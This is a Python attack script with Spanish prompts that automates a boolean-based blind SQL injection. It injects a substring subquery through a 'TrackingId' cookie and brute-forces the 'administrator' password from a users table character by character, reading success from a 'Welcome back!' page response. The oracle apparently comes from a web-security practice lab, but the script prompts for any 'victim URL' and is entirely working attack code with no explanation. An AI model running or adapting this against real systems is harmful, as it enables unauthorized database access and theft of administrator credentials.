from pwn import *
import requests,signal,time, pdb,sys,string
from termcolor import colored

def def_handler(sig,frame):
    print("\n[+] Tarea termianda por el usuario...")
    sys.exit(1)
# exit code with ctrl+c

signal.signal(signal.SIGINT,def_handler)



def request():



    main_url= str(input(colored("Ingresar la URL victima: ",color="red")))
    #catch the data to insert
    caracteres=  string.ascii_uppercase+string.ascii_lowercase+string.digits
    insertCookie= str(input(colored("Insertar Cookie Vulnerable: ",color="blue")))
    sessionToken=str(input(colored("Insertar Token Sesion: ", color="blue")))
    p1= log.progress("Fuerza Bruta") 

    time.sleep(2)

    p2=log.progress("Password")

    password=""
   

    #iterar por posicciones del 1 al 20 
    for position in range(1,21):
        for char in caracteres:
            #iterar en los caracteres
            cookies={
                'TrackingId': f"{insertCookie} ' and (select substring(password,{position},1) from users where username='administrator')='{char}",
                'session':f'{sessionToken}'
            }

            p1.status(cookies['TrackingId'])

            r=requests.get(main_url,cookies=cookies)

            if "Welcome back!" in r.text:
                p2.status(password)
                password += char
                break

    

if __name__=='__main__':

    

    request()
    


